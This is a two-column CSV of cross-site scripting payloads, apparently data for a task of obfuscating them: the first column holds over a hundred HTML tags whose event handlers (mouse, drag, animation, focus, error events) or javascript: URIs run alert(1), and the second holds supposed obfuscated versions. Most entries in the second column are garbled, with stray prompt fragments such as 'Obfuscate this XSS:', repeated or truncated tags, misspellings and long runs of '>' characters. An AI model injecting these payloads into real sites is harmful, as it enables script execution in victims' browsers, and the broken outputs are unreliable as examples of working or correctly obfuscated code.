original,ofuscado
"<col onmouseover=""alert(1)"">test</col>","XSS: col onmouseover=""alert(1)"">test/col>"
"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>","dfn draggable=""true"" ondragleave=""alert(1)"">test/dfn>"
"<param onpaste=""alert(1)"" contenteditable>test</param>",":fuscate this XSS: param onpaste=""alert(1)"" contenteditable>test/param>"
<script onerror=alert(1) src=/></script>,s=alert(1) src=/>/script>
"<div draggable=""true"" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>",>select ondrop=alert(1) contenteditable>drop here/select>drop here/select>>drag me/div>select ondrop=alert(1) contenteditable>drop here/select>
<strong id=x tabindex=1 onactivate=alert(1)></strong>,>/strong>
"<blockquote onmouseenter=""alert(1)"">test</blockquote>",": blockquote onmouseenter=""alert(1)"">test/blockquote>"
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",": dd draggable=""true"" ondrag=""alert(1)"">test/dd>"
<meta onpointerdown=alert(1)>xss</meta>,: meta onpointerdown=alert(1)>xss/meta>.
<animate onpointerover=alert(1)>xss</animate>,&#xss== Animated onpointerover=alert(1)>xss/animate>
<noscript onpointerover=alert(1)>xss</noscript>,:=alert(1)>xss/noscript>.
"<q onbeforecut=""alert(1)"" contenteditable>test</q>","q onbeforecut=""alert(1)"" contenteditable>test/q>"
"<li ondblclick=""alert(1)"">test</li>",>test/li>
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>","XSS: div draggable=""true"" contenteditable>drag me/div>link ondrop=alert(1) contenteditable>drop here/link>"
"<ruby draggable=""true"" ondrag=""alert(1)"">test</ruby>",> test/ruby>
"<ins onkeydown=""alert(1)"" contenteditable>test</ins>",>test/ins> to determine if the XSS should have a long list of outputs.
<cite id=x tabindex=1 onfocusin=alert(1)></cite>,Obfuscate this XSS: cite id=x tabindex=1 onfocusin=alert(1)>/cite>
"<dir draggable=""true"" ondragenter=""alert(1)"">test</dir>","XSS: dir draggable=""true"" ondragenter=""alert(1)"">test/dir>"
<colgroup onpointerdown=alert(1)>xss</colgroup>,:colgroup onpointerdown=alert(1)>xss/colgroup>
"<div onclick=""alert(1)"">test</div>","div onclick=""alert(1)"">test/div>"
"<font onmouseover=""alert(1)"">test</font>",": font onmouseover=""alert(1)"">test/font>"
<h1 onpointerup=alert(1)>xss</h1>,XSS: h1 onpointerup=alert(1)>xss/h1>
"<details onmousedown=""alert(1)"">test</details>",":totedown=""alert(1)"">test/details> XSS: details onmousedown=""alert(1)"">test/detail>"
"<th onclick=""alert(1)"">test</th>",>test/th>
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",": progress onbeforecopy=""alert(1)"" contenteditable>test/progress>"
<image onpointerover=alert(1)>xss</image>,: image onpointerover=alert(1)>xss/image>
<nobr onpointerleave=alert(1)>xss</nobr>,: nobr onpointerleave=alert(1)>xss/nobr>.
<script> alert(asdal'') </script>,alert(asdal''' /script> alert(asdal'' /script> alert(asdal'' /script> alert(asdal''' /script> alert(asdal''' XSS: /script> alert(asdal'' alert.
<nobr onpointerenter=alert(1)>xss</nobr>,a> xss (Nobr onpointerenter=alert(1)>xss/nobr>)
"<audio onmouseleave=""alert(1)"">test</audio>","the/audio>: audio onmouseleave=""alert(1)"">test/audio>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figure>","/style>figure id=x style=""position:absolute;"" style=""alert(1)"">/figure>-figure>/figure>d=x style=""position:absolute;"" style=""position:absolute;"" style=""alert(1)"">/figure>/figure>left: left:0;to left: 1000px;:target animation:10s ease"
<time onpointermove=alert(1)>xss</time>,XSS: time onpointermove=alert(1)>xss/time>
"<frameset draggable=""true"" ondragleave=""alert(1)"">test</frameset>",":t frameset draggable=""true"" ondragleave=""alert(1)"">test/frameset>"
"<img onmousedown=""alert(1)"">test</img>",": img onmousedown=""alert(1)"">test/img>"
"<link onmouseleave=""alert(1)"">test</link>","> test/link>> link onmouseleave=""alert(1)"">test/link>"
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationend=""alert(1)""></shadow>","XSS: style>@keyframes x/style>shadow style=""animation-name:x"" onanimationend=""alert(1)"">/shadow>/shadow> XSS: style>@keyframes x/style>shadow style=""animation-name:x"" onanimationend=""alert(1)"">/shadow> XSS: style>@keyframes x/style>shadow style=""animation-"
"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",>test /tr>
<td onpointerup=alert(1)>xss</td>,this XSS: td onpointerup=alert(1)>xss/td>
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",": style>@keyframes x/style>canvas style=""animation-name:x"" onanimationstart=""alert(1)"">/canvas>>/canvas>"
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></fieldset>","XSS: style>@keyframes slidein /style>>fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/fieldset>/fieldset>/fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""a"
<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>,xSS: label id=x tabindex=1 onbeforedeactivate=alert(1)>/label>input autofocus>
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>,/i>
"<section draggable=""true"" ondragenter=""alert(1)"">test</section>","section draggable=""true"" ondragenter=""alert(1)"">test/section>"
<input oninput=alert(1) value=xss>,=xss>.
"<svg draggable=""true"" ondragend=""alert(1)"">test</svg>",": svg draggable=""true"" ondragend=""alert(1)"">test/svg>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></object>","animation:10s ease-in-out 0s 1 x;/style>object id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/object>@keyframes xfrom left:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>object id=x style=""position"
<meter id=x tabindex=1 ondeactivate=alert(1)></meter><input id=y autofocus>,xSS: meter id=x tabindex=1 ondeactivate=alert(1)>/meter>input id=y autofocus>
<keygen onpointermove=alert(1)>xss</keygen>,cde: keygen onpointermove=alert(1)>xss/keygen>.
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tfoot>","animation:10s ease-in-out 0s 1 x;/style>tfoot id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/tfoot>/tfoot> XSS: style>@keyframes xfrom left:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x"
"<blink oncut=""alert(1)"" contenteditable>test</blink>","Obfuscate this XSS: blink oncut=""alert(1)"" contenteditable>test/blink>"
<samp onpointerdown=alert(1)>xss</samp>,__/samp>.
"<slot oncopy=""alert(1)"" contenteditable>test</slot>",""""" contenteditable>test/slot>."
"<mark oncontextmenu=""alert(1)"">test</mark>","the XSS: mark oncontextmenu=""alert(1)"">test/mark>"
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,the XSS: code id=x tabindex=1 onbeforedeactivate=alert(1)>/code>input autofocus>
"<div draggable=""true"" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>",=alert(1) contenteditable>drop here/strike>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"<del onkeypress=""alert(1)"" contenteditable>test</del>",re-run to/del> contenteditable>test/del>
"<blink onclick=""alert(1)"">test</blink>","blink onclick=""alert(1)"">test/blink>"
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>","/small>/small styles=""animation-name:x"" onanimationend=""alert(1)"">/small>/small>/small>/small>/small>/small>/small> XSS: style>@keyframes x/style>small style=""animation-name:x"" onanimationend=""alert(1)"">/small>/small>/small>."
<span onpointerout=alert(1)>xss</span>,: span onpointerout=alert(1)>xss/span>
"<shadow onmouseleave=""alert(1)"">test</shadow>",": shadow onmouseleave=""alert(1)"">test/shadow>"
"<figure onmouseover=""alert(1)"">test</figure>",": figure onmouseover=""alert(1)"">test/figure>"
<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>,:id=x tabindex=1 onbeforeactivate=alert(1)>/figure>
"<tt onbeforecut=""alert(1)"" contenteditable>test</tt>",": tt onbeforecut=""alert(1)"" contenteditable>test/tt>"
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionend=alert(1)></nobr>","id=x style=""transition:color 1s"" ontransitionend=alert(1)>/nobr>"
"<div draggable=""true"" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>",-() - contenteditable>drag me/div>code ondrop=alert(1) contenteditable>drop here/code>
<optgroup onpointerdown=alert(1)>xss</optgroup>,: optgroup offpointerdown=alert(1)>xss/optgroup>
"<blockquote onkeydown=""alert(1)"" contenteditable>test</blockquote>",": blockquote onkeydown=""alert(1)"" contenteditable>test/blockquote>"
"<samp draggable=""true"" ondragend=""alert(1)"">test</samp>",": samp draggable=""true"" ondragend=""alert(1)"">test/samp>"
"<fieldset onbeforepaste=""alert(1)"" contenteditable>test</fieldset>",""" contenteditable>test/fieldset>"
"<time onpaste=""alert(1)"" contenteditable>test</time>",": time onpaste=""alert(1)"" contenteditable>test/time>"
"<legend ondblclick=""alert(1)"">test</legend>","Obfuscate thisXSS: legend ondblclick=""alert(1)"">test/legend>obfuscate thisXSS: legend ondblclick=""alert(1)"">test/legend>obfuscate thisXSS: legend ondblclick=""alert(1)"">test/legend>"
"<command draggable=""true"" ondragleave=""alert(1)"">test</command>","to avoid using this SSS: command draggable=""true"" ondragleave=""alert(1)"">test/command>"
"<style>@keyframes slidein {}</style><strike style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strike>","/style>@keyframes slidein /style>strike style=""animation-duration:1s;animation-name:slidein;animationiteration-count:2"" onanimationiteration=""alert(1)"">/strike>/strike>/strike>/strike style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimation"
"<caption onkeydown=""alert(1)"" contenteditable>test</caption>","Obfuscate thisXSS: caption onkeydown=""alert(1)"" contenteditable>test/caption>"
"<xmp oncopy=""alert(1)"" contenteditable>test</xmp>","xmp oncopy=""alert(1)"" contenteditable>test/xmp>"
<mark onpointerleave=alert(1)>xss</mark>,Obfuscate this XSS: mark onpointerleave=alert(1)>xss/mark>
<abbr onpointerleave=alert(1)>xss</abbr>,": abbr onpointerleave=alert(1)>xss/abbr>>xfuscate this XSS: abbr onpointerleave=alert(1)>xss/abbr> xss/abbr>xss/abbr>=abbr> xss,>xss, ==br>>xss/abbr>"
<tfoot onpointerleave=alert(1)>xss</tfoot>,XSS: tfoot onpointerleave=alert(1)>xss/tfoot>
<picture id=x tabindex=1 onfocus=alert(1)></picture>,XSS: picture id=x tabindex=1 onfocus=alert(1)>/picture>
javas<!-- -->cript:alert(''),to the XSS: javas!-- -->cript:alert('') XSS: javas!-- -->cript:alert('')
"<style>:target {transform: rotate(180deg);}</style><col id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></col>","format=""transition:transform 2s"" ontransitionrun=alert(1)>/col>/col>col id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/col>."
<svg><shadow onload=alert(1)></shadow>,XSS: svg>shadow onload=alert(1)>/shadow>
"<samp onmouseenter=""alert(1)"">test</samp>",": samp onmouseenter=""alert(1)"">test/samp>"
"<img oncut=""alert(1)"" contenteditable>test</img>","img oncut=""alert(1)"" contenteditable>test/img>"
"<b ondblclick=""alert(1)"">test</b>",/b>test/b>/b>
"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></button>","=""animation"">/taste>/button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/button>/button>/button>/button>/button>/button>/button>/button>/button>/button>/button>/button"
"<optgroup onkeyup=""alert(1)"" contenteditable>test</optgroup>","it — optgroup onkeyup=""alert(1)"" contenteditable>test/optgroup> *optgroup onkeyup=""alert(1)"" contenteditable>test/optgroup>"
"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>","trooking xS: div draggable=""true"" contenteditable>drag me/div>h1 ondrop=alert(1) contenteditable>drop here/h1>"
"href=""javascript:alert('')",
"<noframes oncontextmenu=""alert(1)"">test</noframes>",": noframes oncontextmenu=""alert(1)"">test/noframes>"
"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" ontransitionend=alert(1)></ol>","XSS: style>:target color:red;/style>ol id=x style=""transition:color 1s"" ontransitionend=alert(1)>/ol>"
"<address onclick=""alert(1)"">test</address>",":address onclick=""alert(1)"">test/address>"
<video src/onerror=alert(1)>,alert(1)>>
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationstart=""alert(1)""></hgroup>","in the XSS: style>@keyframes x/style>hgroup style=""animation-name:x"" onanimationstart=""alert(1)"">/hgroup>"
"<shadow onmouseover=""alert(1)"">test</shadow>",": shadow onmouseover=""alert(1)"">test/shadow>"
"<dl oncut=""alert(1)"" contenteditable>test</dl>","the XSS: dl oncut=""alert(1)"" contenteditable>test/dl>"
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>","z: the XSS: style>@keyframes x/style>frame style=""animation-name:x"" onanimationstart=""alert(1)"">/frame>/frame>"
"<tt onkeydown=""alert(1)"" contenteditable>test</tt>","ss: tt onkeydown=""alert(1)"" contenteditable>test/tt>"
"<span oncut=""alert(1)"" contenteditable>test</span>","x. edo-.xz: span oncut=""alert(1)"" contenteditable>test/span>"
"<param oncut=""alert(1)"" contenteditable>test</param>","Obfuscate this XSS: param oncut=""alert(1)"" contenteditable>test/param>"
<h1 onpointerover=alert(1)>xss</h1>,*/h1> &/h1>.
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,XSS: basefont id=x tabindex=1 ondeactivate=alert(1)>/basefont>input id=y autofocus>
"<style>@keyframes slidein {}</style><textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></textarea>",">/textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/textarea> /textarea> /textarea> /textarea> /textarea> /textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration"
"<style>@keyframes slidein {}</style><plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></plaintext>","XSS: style>@keyframes slidein /style>plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/plaintext>/plaintext>/plaintext>/plaintext>/plaintext>/plaintext>/plaintext style=""animation-duration:1s;animation-name:slid"
"<bdi onmouseout=""alert(1)"">test</bdi>",": bdi onmouseout=""alert(1)"">test/bdi>"
"<element onmouseover=""alert(1)"">test</element>",": element onmouseover=""alert(1)"">test/element>"
<menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>,Obfuscate thisXSS: menuitem id=x tabindex=1 onfocusin=alert(1)>/menuitem>
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></div>",", and then a new XSS: style>@keyframes xfrom left:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>div style=""position:absolute;"" onanimationcancel=""alert(1)"">/div>/div>/div>/div>/div>animation:10s ease-"
<q onpointerout=alert(1)>xss</q>,Obfuscate this XSS: q onpointerout=alert(1)>xss/q>
<hgroup onpointerenter=alert(1)>xss</hgroup>,: hgroup onpointerenter=alert(1)>xss/hgroup>.
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>","Obfuscate thisxSS: bdi oncopy=""alert(1)"" contenteditable>test/bdi>"
<listing id=x tabindex=1 onfocusin=alert(1)></listing>,the system. Subsist with that:listing id=x tabindex=1 onfocusin=alert(1)>/listing>
<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>,/meta>input autofocus>
"<param onbeforepaste=""alert(1)"" contenteditable>test</param>","s: param onbeforepaste=""alert(1)"" contenteditable>test/param>"
